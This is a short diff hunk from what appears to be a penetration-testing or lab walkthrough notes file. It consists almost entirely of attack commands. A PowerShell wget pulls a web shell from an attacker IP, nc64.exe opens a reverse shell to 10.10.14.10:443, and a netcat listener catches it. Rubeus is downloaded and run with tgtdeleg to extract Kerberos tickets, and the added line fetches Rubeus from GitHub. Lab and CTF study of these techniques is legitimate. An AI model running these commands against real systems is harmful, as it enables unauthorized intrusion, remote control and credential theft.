@@ -225,6 +225,7 @@ powershell -c wget 10.10.14.10/cmd.aspx -outfile cmd.aspx
 http://127.0.0.1:8001/cmd.aspx
 /c \ProgramData\nc64.exe -e cmd 10.10.14.10 443
 rlwrap -cAr nc -lnvp 443
+wget https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/Rubeus.exe
 cd C:\ProgramData
 powershell -c wget 10.10.14.10/Rubeus.exe -outfile Rubeus.exe
 .\rubeus.exe tgtdeleg /nowrap
